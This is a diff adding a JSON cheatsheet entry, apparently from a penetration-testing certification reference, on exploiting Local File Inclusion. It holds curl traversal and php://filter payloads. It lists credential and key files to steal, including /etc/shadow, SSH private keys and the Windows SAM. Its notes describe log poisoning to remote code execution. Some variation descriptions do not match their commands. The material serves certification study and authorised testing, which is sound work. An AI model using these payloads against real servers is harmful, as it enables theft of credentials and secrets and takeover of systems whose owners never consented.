@@ -1,0 +1,90 @@
+{
+  "platform": "linux",
+  "requires": [
+    "network-access"
+  ],
+  "protocols": [
+    "http"
+  ],
+  "tools": [
+    "curl",
+    "ffuf"
+  ],
+  "tags": [
+    "lfi",
+    "file-read",
+    "cheatsheet",
+    "enumeration"
+  ],
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "Shared - Cross-Module Reference",
+  "examples": [
+    "curl 'http://<ip>/index.php?page=../../../../etc/passwd'",
+    "curl 'http://<ip>/index.php?page=php://filter/convert.base64-encode/resource=config'"
+  ],
+  "notes": "If reads are relative, stack ../ until you hit root. access.log / auth.log / proc-environ are the log-poisoning-to-RCE targets (inject PHP via User-Agent or SSH login, then include the log). php://filter base64-encodes source so PHP is not executed - decode the output to read config secrets.",
+  "references": [
+    {
+      "title": "HighOn.Coffee - LFI Cheat Sheet",
+      "url": "https://highon.coffee/blog/lfi-cheat-sheet/"
+    },
+    {
+      "title": "HTB Academy - File Inclusion",
+      "url": "https://academy.hackthebox.com/module/details/23"
+    },
+    {
+      "title": "OffSec PEN-200 (OSCP)",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "lfi-log-poisoning",
+      "note": "Writes PHP into a server log via a controllable field (here the User-Agent), then includes that log through the LFI so the payload executes."
+    },
+    {
+      "id": "lfi-php-filter",
+      "note": "Reads the PHP source of a file instead of executing it, using the php://filter wrapper with a base64 encoder."
+    }
+  ],
+  "id": "lfi-interesting-files",
+  "name": "LFI - Interesting Files to Read",
+  "type": "cheatsheet",
+  "command": "/etc/passwd  /etc/shadow  /etc/hosts  /home/<user>/.ssh/id_rsa  /var/www/html/config.php",
+  "description": "High-value target files to pull through a Local File Inclusion or arbitrary-file-read. Linux config/credential/log paths and their Windows equivalents. Use with a traversal payload (../../../) or a php://filter source-disclosure wrapper.",
+  "category": "Web Exploitation",
+  "subcategory": "File Inclusion",
+  "variations": [
+    {
+      "label": "Linux - creds/config",
+      "command": "/etc/passwd\n/etc/shadow\n/root/.ssh/id_rsa\n/home/<user>/.ssh/id_rsa\n/var/www/html/config.php\n/etc/apache2/apache2.conf",
+      "description": "Linux - creds/config. See the command syntax for exact usage and parameters."
+    },
+    {
+      "label": "Linux - logs (poisoning)",
+      "command": "/var/log/apache2/access.log\n/var/log/apache2/error.log\n/var/log/nginx/access.log\n/var/log/auth.log\n/proc/self/environ\n/proc/self/fd/N",
+      "description": "Reads web server access or error logs for information gathering. Logs reveal visited URLs, client IPs, user agents, and error messages that may expose internal paths or misconfigurations."
+    },
+    {
+      "label": "Windows",
+      "command": "C:\\Windows\\System32\\drivers\\etc\\hosts\nC:\\Windows\\win.ini\nC:\\Windows\\System32\\config\\SAM\nC:\\inetpub\\wwwroot\\web.config\nC:\\xampp\\apache\\conf\\httpd.conf",
+      "description": "Reads the hosts file for custom hostname-to-IP mappings. Reveals internal hostnames, development servers, and network topology that DNS queries might not show."
+    },
+    {
+      "label": "PHP filter (source)",
+      "command": "php://filter/convert.base64-encode/resource=index.php\nphp://filter/convert.base64-encode/resource=/var/www/html/config.php",
+      "description": "PHP wrapper payload for LFI exploitation. Uses PHP stream wrappers to read source code (php://filter), inject code (php://input), or execute data URIs."
+    }
+  ],
+  "opsec": "moderate",
+  "exam": "exam-ok",
+  "mitre": [
+    "T1083",
+    "T1552.001"
+  ],
+  "explain": "High-value target files to pull through a Local File Inclusion or arbitrary-file-read.\nLinux config/credential/log paths and their Windows equivalents.\nIf reads are relative, stack ../ until you hit root."
+}
